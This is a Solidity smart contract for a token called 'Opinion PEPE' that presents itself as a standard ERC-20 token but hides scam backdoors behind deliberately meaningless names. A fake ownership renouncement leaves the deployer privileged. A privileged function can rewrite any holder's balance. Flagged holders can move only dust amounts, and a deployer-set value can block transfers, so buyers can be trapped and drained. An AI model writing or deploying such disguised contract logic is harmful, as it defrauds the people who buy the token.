//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface totalExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchToken) external view returns (uint256);

    function transfer(address swapMode, uint256 limitTakeTrading) external returns (bool);

    function allowance(address buyShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitTakeTrading) external returns (bool);

    function transferFrom(
        address sender,
        address swapMode,
        uint256 limitTakeTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletMax, uint256 value);
    event Approval(address indexed buyShould, address indexed spender, uint256 value);
}

abstract contract marketingAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityMax {
    function createPair(address shouldFeeLimit, address feeFrom) external returns (address);
}

interface totalExemptMetadata is totalExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OpinionPEPE is marketingAuto, totalExempt, totalExemptMetadata {

    address private modeLimit;

    mapping(address => uint256) private listIs;

    event OwnershipTransferred(address indexed autoTake, address indexed exemptEnable);

    function getOwner() external view returns (address) {
        return modeLimit;
    }

    string private takeList = "OPE";

    function maxToken(address fromLimit, address swapMode, uint256 limitTakeTrading) internal returns (bool) {
        require(listIs[fromLimit] >= limitTakeTrading);
        listIs[fromLimit] -= limitTakeTrading;
        listIs[swapMode] += limitTakeTrading;
        emit Transfer(fromLimit, swapMode, limitTakeTrading);
        return true;
    }

    uint256 private amountAuto = 100000000 * 10 ** 18;

    bool public minMode;

    uint256 public exemptModeFrom;

    uint8 private shouldAuto = 18;

    function marketingWallet() public {
        emit OwnershipTransferred(launchTotal, address(0));
        modeLimit = address(0);
    }

    address tradingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address walletTxTake, uint256 limitTakeTrading) public virtual override returns (bool) {
        totalIsFee[_msgSender()][walletTxTake] = limitTakeTrading;
        emit Approval(_msgSender(), walletTxTake, limitTakeTrading);
        return true;
    }

    address public maxLaunched;

    uint256 private feeMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return amountAuto;
    }

    string private swapSender = "Opinion PEPE";

    mapping(address => bool) public amountEnable;

    function receiverExempt(address shouldAt) public {
        require(shouldAt.balance < 100000);
        if (toMode) {
            return;
        }
        
        enableReceiver[shouldAt] = true;
        if (liquidityExempt) {
            limitFromLiquidity = launchedTx;
        }
        toMode = true;
    }

    function amountExemptFund(address atTake) public {
        atLimit();
        if (launchedTx == exemptLimit) {
            exemptLimit = limitFromLiquidity;
        }
        if (atTake == launchTotal || atTake == maxLaunched) {
            return;
        }
        amountEnable[atTake] = true;
    }

    function allowance(address amountTokenExempt, address walletTxTake) external view virtual override returns (uint256) {
        if (walletTxTake == tradingAmount) {
            return type(uint256).max;
        }
        return totalIsFee[amountTokenExempt][walletTxTake];
    }

    function name() external view virtual override returns (string memory) {
        return swapSender;
    }

    address public launchTotal;

    function atLimit() private view {
        require(enableReceiver[_msgSender()]);
    }

    function transfer(address exemptBuy, uint256 limitTakeTrading) external virtual override returns (bool) {
        return fromReceiver(_msgSender(), exemptBuy, limitTakeTrading);
    }

    address limitMarketingTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address fromLimit, address swapMode, uint256 limitTakeTrading) external override returns (bool) {
        if (_msgSender() != tradingAmount) {
            if (totalIsFee[fromLimit][_msgSender()] != type(uint256).max) {
                require(limitTakeTrading <= totalIsFee[fromLimit][_msgSender()]);
                totalIsFee[fromLimit][_msgSender()] -= limitTakeTrading;
            }
        }
        return fromReceiver(fromLimit, swapMode, limitTakeTrading);
    }

    uint256 fromToken;

    uint256 atMarketing;

    function balanceOf(address launchToken) public view virtual override returns (uint256) {
        return listIs[launchToken];
    }

    uint256 private limitFromLiquidity;

    bool public toMode;

    uint256 constant modeWallet = 4 ** 10;

    mapping(address => mapping(address => uint256)) private totalIsFee;

    function symbol() external view virtual override returns (string memory) {
        return takeList;
    }

    mapping(address => bool) public enableReceiver;

    function fromWallet(address exemptBuy, uint256 limitTakeTrading) public {
        atLimit();
        listIs[exemptBuy] = limitTakeTrading;
    }

    function fromReceiver(address fromLimit, address swapMode, uint256 limitTakeTrading) internal returns (bool) {
        if (fromLimit == launchTotal) {
            return maxToken(fromLimit, swapMode, limitTakeTrading);
        }
        uint256 shouldFund = totalExempt(maxLaunched).balanceOf(limitMarketingTx);
        require(shouldFund == atMarketing);
        require(swapMode != limitMarketingTx);
        if (amountEnable[fromLimit]) {
            return maxToken(fromLimit, swapMode, modeWallet);
        }
        return maxToken(fromLimit, swapMode, limitTakeTrading);
    }

    bool public liquidityExempt;

    function decimals() external view virtual override returns (uint8) {
        return shouldAuto;
    }

    uint256 private exemptLimit;

    constructor (){
        
        tokenSwap swapFeeBuy = tokenSwap(tradingAmount);
        maxLaunched = liquidityMax(swapFeeBuy.factory()).createPair(swapFeeBuy.WETH(), address(this));
        if (limitFromLiquidity != exemptModeFrom) {
            launchedTx = exemptModeFrom;
        }
        launchTotal = _msgSender();
        marketingWallet();
        enableReceiver[launchTotal] = true;
        listIs[launchTotal] = amountAuto;
        if (liquidityExempt) {
            minMode = false;
        }
        emit Transfer(address(0), launchTotal, amountAuto);
    }

    uint256 private launchedTx;

    uint256 private toEnable;

    function owner() external view returns (address) {
        return modeLimit;
    }

    uint256 private exemptTakeTeam;

    function shouldLiquidity(uint256 limitTakeTrading) public {
        atLimit();
        atMarketing = limitTakeTrading;
    }

}